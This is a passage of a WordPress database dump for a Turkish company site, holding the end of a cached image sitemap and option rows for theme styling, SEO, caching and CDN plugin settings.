		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/attachment/26/</loc>
		<lastmod>2017-01-25T20:44:03+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/26.jpg</image:loc>
			<image:title><![CDATA[26]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/d3c57213/</loc>
		<lastmod>2017-01-25T20:44:25+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/D3C57213.jpg</image:loc>
			<image:title><![CDATA[D3C57213]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/d3c57230/</loc>
		<lastmod>2017-01-25T20:45:06+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/D3C57230.jpg</image:loc>
			<image:title><![CDATA[D3C57230]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/d3c57242/</loc>
		<lastmod>2017-01-25T20:45:52+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/D3C57242.jpg</image:loc>
			<image:title><![CDATA[D3C57242]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/img-20161220-wa0010/</loc>
		<lastmod>2017-01-25T20:46:14+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0010.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0010]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/img-20161220-wa0011/</loc>
		<lastmod>2017-01-25T20:46:33+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0011.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0011]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/img-20161220-wa0012/</loc>
		<lastmod>2017-01-25T20:46:54+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0012.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0012]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/img-20161220-wa0015/</loc>
		<lastmod>2017-01-25T20:47:10+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0015.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0015]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/standlar/dsc01389/</loc>
		<lastmod>2017-01-25T20:47:18+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/DSC01389.jpg</image:loc>
			<image:title><![CDATA[DSC01389]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/img-20161220-wa0017/</loc>
		<lastmod>2017-01-25T20:47:31+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0017.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0017]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/img-20161220-wa0021/</loc>
		<lastmod>2017-01-25T20:47:50+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0021.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0021]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/standlar/dsc01391/</loc>
		<lastmod>2017-01-25T20:47:52+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/DSC01391.jpg</image:loc>
			<image:title><![CDATA[DSC01391]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/img-20161220-wa0022/</loc>
		<lastmod>2017-01-25T20:48:09+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0022.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0022]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/standlar/imag0375/</loc>
		<lastmod>2017-01-25T20:48:16+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMAG0375.jpg</image:loc>
			<image:title><![CDATA[IMAG0375]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/img-20161220-wa0023/</loc>
		<lastmod>2017-01-25T20:48:26+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0023.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0023]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/standlar/img-20160323-wa0002/</loc>
		<lastmod>2017-01-25T20:48:42+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20160323-WA0002.jpg</image:loc>
			<image:title><![CDATA[IMG-20160323-WA0002]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/img-20161220-wa0024/</loc>
		<lastmod>2017-01-25T20:48:45+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0024.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0024]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/img-20161220-wa0025/</loc>
		<lastmod>2017-01-25T20:49:09+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0025.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0025]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/standlar/img-20160323-wa0003/</loc>
		<lastmod>2017-01-25T20:49:15+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20160323-WA0003.jpg</image:loc>
			<image:title><![CDATA[IMG-20160323-WA0003]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/img-20161220-wa0026/</loc>
		<lastmod>2017-01-25T20:49:29+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0026.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0026]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/img-20161220-wa0030/</loc>
		<lastmod>2017-01-25T20:50:12+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0030.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0030]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/standlar/pls-stand-1/</loc>
		<lastmod>2017-01-25T20:50:17+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/pls-stand-1.jpg</image:loc>
			<image:title><![CDATA[pls stand 1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/img-20161220-wa0031/</loc>
		<lastmod>2017-01-25T20:50:26+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0031.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0031]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/img-20161220-wa0032/</loc>
		<lastmod>2017-01-25T20:50:45+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0032.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0032]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/img-20161220-wa0033/</loc>
		<lastmod>2017-01-25T20:50:58+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0033.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0033]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/standlar/untitled-1-copy/</loc>
		<lastmod>2017-01-25T20:51:06+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/Untitled-1-copy.jpg</image:loc>
			<image:title><![CDATA[Untitled-1 copy]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/img-20161220-wa0034/</loc>
		<lastmod>2017-01-25T20:51:50+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0034.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0034]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/img-20161220-wa0035/</loc>
		<lastmod>2017-01-25T20:52:09+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0035.jpg</image:loc>
			<image:title><![CDATA[IMG-20161220-WA0035]]></image:title>
		</image:image>
	</url>
</urlset>\";}}","no");
INSERT INTO `cmrfu_options` VALUES("15402","WPLANG","tr_TR","yes");
INSERT INTO `cmrfu_options` VALUES("188","ossdl_off_include_dirs","wp-content,wp-includes","yes");
INSERT INTO `cmrfu_options` VALUES("19526","_site_transient_timeout_theme_roots","1490141366","no");
INSERT INTO `cmrfu_options` VALUES("19527","_site_transient_theme_roots","a:1:{s:7:\"er-leaf\";s:7:\"/themes\";}","no");
INSERT INTO `cmrfu_options` VALUES("187","ossdl_off_cdn_url","http://www.ismido.com.tr","yes");
INSERT INTO `cmrfu_options` VALUES("163","theme_mods_twentyfourteen","a:1:{s:16:\"sidebars_widgets\";a:2:{s:4:\"time\";i:1392750025;s:4:\"data\";a:4:{s:19:\"wp_inactive_widgets\";a:0:{}s:9:\"sidebar-1\";a:6:{i:0;s:8:\"search-2\";i:1;s:14:\"recent-posts-2\";i:2;s:17:\"recent-comments-2\";i:3;s:10:\"archives-2\";i:4;s:12:\"categories-2\";i:5;s:6:\"meta-2\";}s:9:\"sidebar-2\";a:0:{}s:9:\"sidebar-3\";a:0:{}}}}","yes");
INSERT INTO `cmrfu_options` VALUES("164","current_theme","ER-Leaf (Shared on www.MafiaShare.net)","yes");
INSERT INTO `cmrfu_options` VALUES("165","theme_mods_er-leaf","a:113:{s:15:\"general_heading\";s:12:\"Blog Options\";s:21:\"textarea_trackingcode\";s:0:\"\";s:13:\"media_favicon\";s:0:\"\";s:20:\"media_favicon_iphone\";s:0:\"\";s:27:\"media_favicon_iphone_retina\";s:0:\"\";s:18:\"media_favicon_ipad\";s:0:\"\";s:25:\"media_favicon_ipad_retina\";s:0:\"\";s:18:\"select_layoutstyle\";s:12:\"Boxed Layout\";s:16:\"check_responsive\";i:1;s:8:\"media_bg\";s:56:\"[site_url]/wp-content/uploads/2014/02/bright_squares.png\";s:9:\"select_bg\";s:6:\"repeat\";s:8:\"color_bg\";s:5:\"#1111\";s:16:\"check_topwidgets\";s:1:\"0\";s:21:\"topbar_widget_1_width\";s:5:\"col-4\";s:21:\"topbar_widget_2_width\";s:5:\"col-4\";s:21:\"topbar_widget_3_width\";s:5:\"col-4\";s:21:\"topbar_widget_4_width\";s:5:\"col-4\";s:16:\"select_main_menu\";s:9:\"Fullwidth\";s:16:\"text_companynews\";s:0:\"\";s:11:\"text_callus\";s:0:\"\";s:17:\"check_companynews\";s:1:\"0\";s:18:\"style_headerheight\";s:4:\"auto\";s:10:\"media_logo\";s:0:\"\";s:19:\"style_logotopmargin\";s:4:\"20px\";s:22:\"style_logobottommargin\";s:3:\"0px\";s:17:\"media_logo_retina\";s:0:\"\";s:10:\"logo_width\";s:3:\"200\";s:11:\"logo_height\";s:3:\"158\";s:17:\"check_footertweet\";s:1:\"0\";s:21:\"footer_widget_1_width\";s:5:\"col-4\";s:21:\"footer_widget_2_width\";s:5:\"col-4\";s:21:\"footer_widget_3_width\";s:5:\"col-4\";s:21:\"footer_widget_4_width\";s:5:\"col-4\";s:18:\"textarea_copyright\";s:28:\"Copyright 2016 ismido.com.tr\";s:9:\"font_body\";a:4:{s:4:\"size\";s:4:\"13px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:6:\"normal\";s:5:\"color\";s:7:\"#232323\";}s:7:\"font_h1\";a:4:{s:4:\"size\";s:4:\"22px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:4:\"bold\";s:5:\"color\";s:7:\"#666666\";}s:7:\"font_h2\";a:4:{s:4:\"size\";s:4:\"20px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:4:\"bold\";s:5:\"color\";s:7:\"#666666\";}s:7:\"font_h3\";a:4:{s:4:\"size\";s:4:\"18px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:4:\"bold\";s:5:\"color\";s:7:\"#666666\";}s:7:\"font_h4\";a:4:{s:4:\"size\";s:4:\"16px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:4:\"bold\";s:5:\"color\";s:7:\"#666666\";}s:7:\"font_h5\";a:4:{s:4:\"size\";s:4:\"14px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:4:\"bold\";s:5:\"color\";s:7:\"#666666\";}s:7:\"font_h6\";a:4:{s:4:\"size\";s:4:\"12px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:4:\"bold\";s:5:\"color\";s:7:\"#666666\";}s:13:\"color_general\";s:7:\"#26c4e7\";s:10:\"color_link\";s:7:\"#555555\";s:11:\"color_hover\";s:7:\"#26c4e7\";s:21:\"background_top_widget\";s:7:\"#181818\";s:23:\"font_top_widget_heading\";a:4:{s:4:\"size\";s:4:\"16px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:6:\"normal\";s:5:\"color\";s:7:\"#797979\";}s:16:\"color_top_widget\";s:7:\"#333333\";s:28:\"color_top_widget_form_border\";s:7:\"#222222\";s:34:\"color_focus_top_widget_form_border\";s:7:\"#333333\";s:22:\"color_label_top_widget\";s:7:\"#333333\";s:27:\"background_top_search_input\";s:7:\"#222222\";s:38:\"background_focustop_search_input_focus\";s:7:\"#212121\";s:22:\"color_top_search_input\";s:7:\"#797979\";s:22:\"color_header_boder_top\";s:7:\"#26c4e7\";s:29:\"color_header_background_color\";s:7:\"#ffffff\";s:11:\"font_callus\";a:4:{s:4:\"size\";s:4:\"13px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:6:\"normal\";s:5:\"color\";s:7:\"#aaaaaa\";}s:8:\"font_nav\";a:4:{s:4:\"size\";s:4:\"13px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:4:\"bold\";s:5:\"color\";s:7:\"#555555\";}s:18:\"color_navlinkhover\";s:7:\"#26c4e7\";s:19:\"color_navlinkactive\";s:7:\"#26c4e7\";s:15:\"color_submenubg\";s:7:\"#191919\";s:19:\"color_submenuborder\";s:7:\"#222222\";s:17:\"color_submenulink\";s:7:\"#dedede\";s:20:\"color_submenubghover\";s:7:\"#111111\";s:22:\"color_submenulinkhover\";s:7:\"#eeeeee\";s:32:\"color_portfolio_title_background\";s:7:\"#26c4e7\";s:21:\"color_portfolio_title\";s:7:\"#ffffff\";s:24:\"color_portfolio_category\";s:7:\"#ffffff\";s:30:\"color_hover_portfolio_category\";s:7:\"#eeeeee\";s:17:\"font_widget_title\";a:4:{s:4:\"size\";s:4:\"14px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:4:\"bold\";s:5:\"color\";s:7:\"#232323\";}s:23:\"border_top_widget_title\";a:3:{s:5:\"width\";s:1:\"1\";s:5:\"style\";s:5:\"solid\";s:5:\"color\";s:7:\"#232323\";}s:26:\"border_bottom_widget_title\";a:3:{s:5:\"width\";s:1:\"1\";s:5:\"style\";s:5:\"solid\";s:5:\"color\";s:7:\"#f1f1f1\";}s:19:\"font_sidebar_widget\";a:4:{s:4:\"size\";s:4:\"13px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:6:\"normal\";s:5:\"color\";s:7:\"#232323\";}s:25:\"color_link_sidebar_widget\";s:7:\"#555555\";s:31:\"color_link_hover_sidebar_widget\";s:7:\"#27b59d\";s:22:\"background_twitter_bar\";s:7:\"#26c4e7\";s:17:\"color_twitter_bar\";s:7:\"#ffffff\";s:22:\"color_link_twitter_bar\";s:7:\"#ffffff\";s:28:\"color_link_hover_twitter_bar\";s:7:\"#ffffff\";s:14:\"color_footerbg\";s:7:\"#181818\";s:16:\"color_footertext\";s:7:\"#797979\";s:19:\"font_footerheadline\";a:4:{s:4:\"size\";s:4:\"14px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:4:\"bold\";s:5:\"color\";s:7:\"#cccccc\";}s:16:\"color_footerlink\";s:7:\"#797979\";s:21:\"color_footerlinkhover\";s:7:\"#cccccc\";s:17:\"color_copyrightbg\";s:7:\"#060606\";s:19:\"color_copyrighttext\";s:7:\"#393939\";s:19:\"color_copyrightlink\";s:7:\"#393939\";s:24:\"color_copyrightlinkhover\";s:7:\"#494949\";s:17:\"select_bloglayout\";s:10:\"Blog Large\";s:18:\"select_blogsidebar\";s:13:\"sidebar-right\";s:14:\"check_sharebox\";i:1;s:18:\"text_excerptlength\";s:2:\"30\";s:15:\"check_authorbox\";i:1;s:16:\"check_relatepost\";i:1;s:18:\"text_portfolioslug\";s:14:\"portfolio-item\";s:28:\"text_portfolio_category_slug\";s:18:\"portfolio_category\";s:23:\"text_portfolio_tag_slug\";s:12:\"tag_category\";s:24:\"select_portfolio_archive\";s:9:\"4 Columns\";s:12:\"introduction\";s:75:\"Enter your username / URL to show or leave blank to hide Social Media Icons\";s:14:\"social_twitter\";s:6:\"ismido\";s:15:\"social_dribbble\";s:0:\"\";s:13:\"social_flickr\";s:0:\"\";s:15:\"social_facebook\";s:26:\"http://facebook.com/ismido\";s:13:\"social_google\";s:0:\"\";s:15:\"social_linkedin\";s:0:\"\";s:14:\"social_youtube\";s:0:\"\";s:16:\"social_pinterest\";s:0:\"\";s:10:\"social_rss\";i:1;s:16:\"textarea_csscode\";s:0:\"\";s:9:\"of_backup\";s:0:\"\";s:11:\"of_transfer\";s:0:\"\";s:9:\"smof_init\";s:31:\"Mon, 02 Jun 2014 09:04:31 +0000\";s:18:\"nav_menu_locations\";a:2:{s:6:\"header\";i:51;s:6:\"footer\";i:52;}s:18:\"custom_css_post_id\";i:-1;}","yes");
INSERT INTO `cmrfu_options` VALUES("166","theme_switched","","yes");
INSERT INTO `cmrfu_options` VALUES("189","ossdl_off_exclude",".php","yes");
INSERT INTO `cmrfu_options` VALUES("180","wpseo","a:23:{s:14:\"blocking_files\";a:0:{}s:15:\"ms_defaults_set\";b:0;s:7:\"version\";s:3:\"4.4\";s:12:\"company_logo\";s:0:\"\";s:12:\"company_name\";s:0:\"\";s:17:\"company_or_person\";s:0:\"\";s:20:\"disableadvanced_meta\";b:1;s:19:\"onpage_indexability\";b:1;s:12:\"googleverify\";s:0:\"\";s:8:\"msverify\";s:0:\"\";s:11:\"person_name\";s:0:\"\";s:12:\"website_name\";s:0:\"\";s:22:\"alternate_website_name\";s:0:\"\";s:12:\"yandexverify\";s:0:\"\";s:9:\"site_type\";s:0:\"\";s:20:\"has_multiple_authors\";b:0;s:16:\"environment_type\";s:0:\"\";s:23:\"content_analysis_active\";b:1;s:23:\"keyword_analysis_active\";b:1;s:20:\"enable_setting_pages\";b:1;s:21:\"enable_admin_bar_menu\";b:1;s:22:\"show_onboarding_notice\";b:0;s:18:\"first_activated_on\";i:1476662827;}","yes");
INSERT INTO `cmrfu_options` VALUES("181","wpseo_titles","a:98:{s:10:\"title_test\";i:0;s:17:\"forcerewritetitle\";b:0;s:14:\"hide-feedlinks\";b:0;s:12:\"hide-rsdlink\";b:0;s:14:\"hide-shortlink\";b:0;s:16:\"hide-wlwmanifest\";b:0;s:5:\"noodp\";b:0;s:6:\"noydir\";b:0;s:15:\"usemetakeywords\";b:0;s:16:\"title-home-wpseo\";s:42:\"%%sitename%% %%page%% %%sep%% %%sitedesc%%\";s:18:\"title-author-wpseo\";s:41:\"%%name%%, Author at %%sitename%% %%page%%\";s:19:\"title-archive-wpseo\";s:38:\"%%date%% %%page%% %%sep%% %%sitename%%\";s:18:\"title-search-wpseo\";s:63:\"You searched for %%searchphrase%% %%page%% %%sep%% %%sitename%%\";s:15:\"title-404-wpseo\";s:35:\"Page Not Found %%sep%% %%sitename%%\";s:19:\"metadesc-home-wpseo\";s:0:\"\";s:21:\"metadesc-author-wpseo\";s:0:\"\";s:22:\"metadesc-archive-wpseo\";s:0:\"\";s:18:\"metakey-home-wpseo\";s:0:\"\";s:20:\"metakey-author-wpseo\";s:0:\"\";s:22:\"noindex-subpages-wpseo\";b:0;s:20:\"noindex-author-wpseo\";b:0;s:21:\"noindex-archive-wpseo\";b:1;s:14:\"disable-author\";b:0;s:12:\"disable-date\";b:0;s:10:\"title-post\";s:39:\"%%title%% %%page%% %%sep%% %%sitename%%\";s:13:\"metadesc-post\";s:0:\"\";s:12:\"metakey-post\";s:0:\"\";s:12:\"noindex-post\";b:0;s:17:\"noauthorship-post\";b:0;s:13:\"showdate-post\";b:0;s:16:\"hideeditbox-post\";b:0;s:10:\"title-page\";s:39:\"%%title%% %%page%% %%sep%% %%sitename%%\";s:13:\"metadesc-page\";s:0:\"\";s:12:\"metakey-page\";s:0:\"\";s:12:\"noindex-page\";b:0;s:17:\"noauthorship-page\";b:0;s:13:\"showdate-page\";b:0;s:16:\"hideeditbox-page\";b:0;s:16:\"title-attachment\";s:39:\"%%title%% %%page%% %%sep%% %%sitename%%\";s:19:\"metadesc-attachment\";s:0:\"\";s:18:\"metakey-attachment\";s:0:\"\";s:18:\"noindex-attachment\";b:0;s:23:\"noauthorship-attachment\";b:0;s:19:\"showdate-attachment\";b:0;s:22:\"hideeditbox-attachment\";b:0;s:15:\"title-portfolio\";s:39:\"%%title%% %%page%% %%sep%% %%sitename%%\";s:18:\"metadesc-portfolio\";s:0:\"\";s:17:\"metakey-portfolio\";s:0:\"\";s:17:\"noindex-portfolio\";b:0;s:22:\"noauthorship-portfolio\";b:0;s:18:\"showdate-portfolio\";b:0;s:21:\"hideeditbox-portfolio\";b:0;s:12:\"title-slider\";s:39:\"%%title%% %%page%% %%sep%% %%sitename%%\";s:15:\"metadesc-slider\";s:0:\"\";s:14:\"metakey-slider\";s:0:\"\";s:14:\"noindex-slider\";b:0;s:19:\"noauthorship-slider\";b:0;s:15:\"showdate-slider\";b:0;s:18:\"hideeditbox-slider\";b:0;s:25:\"title-ptarchive-portfolio\";s:51:\"%%pt_plural%% Archive %%page%% %%sep%% %%sitename%%\";s:28:\"metadesc-ptarchive-portfolio\";s:0:\"\";s:27:\"metakey-ptarchive-portfolio\";s:0:\"\";s:27:\"bctitle-ptarchive-portfolio\";s:0:\"\";s:27:\"noindex-ptarchive-portfolio\";b:0;s:22:\"title-ptarchive-slider\";s:51:\"%%pt_plural%% Archive %%page%% %%sep%% %%sitename%%\";s:25:\"metadesc-ptarchive-slider\";s:0:\"\";s:24:\"metakey-ptarchive-slider\";s:0:\"\";s:24:\"bctitle-ptarchive-slider\";s:0:\"\";s:24:\"noindex-ptarchive-slider\";b:0;s:18:\"title-tax-category\";s:53:\"%%term_title%% Archives %%page%% %%sep%% %%sitename%%\";s:21:\"metadesc-tax-category\";s:0:\"\";s:20:\"metakey-tax-category\";s:0:\"\";s:24:\"hideeditbox-tax-category\";b:0;s:20:\"noindex-tax-category\";b:0;s:18:\"title-tax-post_tag\";s:53:\"%%term_title%% Archives %%page%% %%sep%% %%sitename%%\";s:21:\"metadesc-tax-post_tag\";s:0:\"\";s:20:\"metakey-tax-post_tag\";s:0:\"\";s:24:\"hideeditbox-tax-post_tag\";b:0;s:20:\"noindex-tax-post_tag\";b:0;s:21:\"title-tax-post_format\";s:53:\"%%term_title%% Archives %%page%% %%sep%% %%sitename%%\";s:24:\"metadesc-tax-post_format\";s:0:\"\";s:23:\"metakey-tax-post_format\";s:0:\"\";s:27:\"hideeditbox-tax-post_format\";b:0;s:23:\"noindex-tax-post_format\";b:0;s:28:\"title-tax-portfolio_category\";s:53:\"%%term_title%% Archives %%page%% %%sep%% %%sitename%%\";s:31:\"metadesc-tax-portfolio_category\";s:0:\"\";s:30:\"metakey-tax-portfolio_category\";s:0:\"\";s:34:\"hideeditbox-tax-portfolio_category\";b:0;s:30:\"noindex-tax-portfolio_category\";b:0;s:23:\"title-tax-portfolio_tag\";s:53:\"%%term_title%% Archives %%page%% %%sep%% %%sitename%%\";s:26:\"metadesc-tax-portfolio_tag\";s:0:\"\";s:25:\"metakey-tax-portfolio_tag\";s:0:\"\";s:29:\"hideeditbox-tax-portfolio_tag\";b:0;s:25:\"noindex-tax-portfolio_tag\";b:0;s:14:\"title-category\";s:53:\"%%term_title%% Archives %%page%% %%sep%% %%sitename%%\";s:14:\"title-post_tag\";s:53:\"%%term_title%% Archives %%page%% %%sep%% %%sitename%%\";s:17:\"title-post_format\";s:53:\"%%term_title%% Archives %%page%% %%sep%% %%sitename%%\";s:19:\"noindex-post_format\";b:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("182","wpseo_xml","a:21:{s:22:\"disable_author_sitemap\";b:0;s:22:\"disable_author_noposts\";b:1;s:16:\"enablexmlsitemap\";b:1;s:16:\"entries-per-page\";i:1000;s:14:\"xml_ping_yahoo\";b:1;s:12:\"xml_ping_ask\";b:1;s:38:\"user_role-administrator-not_in_sitemap\";b:0;s:31:\"user_role-editor-not_in_sitemap\";b:0;s:31:\"user_role-author-not_in_sitemap\";b:0;s:36:\"user_role-contributor-not_in_sitemap\";b:0;s:35:\"user_role-subscriber-not_in_sitemap\";b:0;s:30:\"post_types-post-not_in_sitemap\";b:0;s:30:\"post_types-page-not_in_sitemap\";b:0;s:36:\"post_types-attachment-not_in_sitemap\";b:0;s:34:\"taxonomies-category-not_in_sitemap\";b:0;s:34:\"taxonomies-post_tag-not_in_sitemap\";b:0;s:37:\"taxonomies-post_format-not_in_sitemap\";b:0;s:44:\"taxonomies-portfolio_category-not_in_sitemap\";b:0;s:39:\"taxonomies-portfolio_tag-not_in_sitemap\";b:0;s:35:\"post_types-portfolio-not_in_sitemap\";b:0;s:32:\"post_types-slider-not_in_sitemap\";b:0;}","yes");
INSERT INTO `cmrfu_options` VALUES("183","wpseo_social","a:14:{s:9:\"fb_admins\";a:0:{}s:6:\"fbapps\";a:0:{}s:12:\"fbconnectkey\";s:32:\"b7b67b1ca5c1754082830a94ae12f4fb\";s:13:\"facebook_site\";s:0:\"\";s:16:\"og_default_image\";s:0:\"\";s:17:\"og_frontpage_desc\";s:0:\"\";s:18:\"og_frontpage_image\";s:0:\"\";s:9:\"opengraph\";b:1;s:10:\"googleplus\";b:0;s:14:\"plus-publisher\";s:0:\"\";s:7:\"twitter\";b:0;s:12:\"twitter_site\";s:0:\"\";s:17:\"twitter_card_type\";s:7:\"summary\";s:10:\"fbadminapp\";i:0;}","yes");
INSERT INTO `cmrfu_options` VALUES("184","wpseo_rss","a:1:{s:8:\"rssafter\";s:53:\"The post %%POSTLINK%% appeared first on %%BLOGLINK%%.\";}","yes");
INSERT INTO `cmrfu_options` VALUES("185","wpseo_permalinks","a:10:{s:15:\"cleanpermalinks\";b:0;s:24:\"cleanpermalink-extravars\";s:0:\"\";s:29:\"cleanpermalink-googlecampaign\";b:0;s:31:\"cleanpermalink-googlesitesearch\";b:0;s:15:\"cleanreplytocom\";b:0;s:10:\"cleanslugs\";b:1;s:15:\"force_transport\";s:7:\"default\";s:18:\"redirectattachment\";b:0;s:17:\"stripcategorybase\";b:0;s:13:\"trailingslash\";b:0;}","yes");
INSERT INTO `cmrfu_options` VALUES("125","recently_activated","a:0:{}","yes");
INSERT INTO `cmrfu_options` VALUES("210","category_children","a:0:{}","yes");
INSERT INTO `cmrfu_options` VALUES("133","underConstructionRequiredRole","0","yes");
INSERT INTO `cmrfu_options` VALUES("135","_transient_twentyfourteen_category_count","1","yes");
INSERT INTO `cmrfu_options` VALUES("1183","supercache_stats","a:3:{s:9:\"generated\";i:1484328831;s:10:\"supercache\";a:5:{s:7:\"expired\";i:0;s:12:\"expired_list\";a:0:{}s:6:\"cached\";i:0;s:11:\"cached_list\";a:0:{}s:2:\"ts\";i:1484328831;}s:7:\"wpcache\";a:3:{s:6:\"cached\";i:0;s:7:\"expired\";i:0;s:5:\"fsize\";s:3:\"0KB\";}}","yes");
INSERT INTO `cmrfu_options` VALUES("139","_transient_random_seed","bb370306c53f941af2d8531ae51b74ab","yes");
INSERT INTO `cmrfu_options` VALUES("227","nav_menu_options","a:2:{i:0;b:0;s:8:\"auto_add\";a:0:{}}","yes");
INSERT INTO `cmrfu_options` VALUES("190","ossdl_cname","","yes");
INSERT INTO `cmrfu_options` VALUES("193","wpcf7","a:1:{s:7:\"version\";s:3:\"4.7\";}","yes");
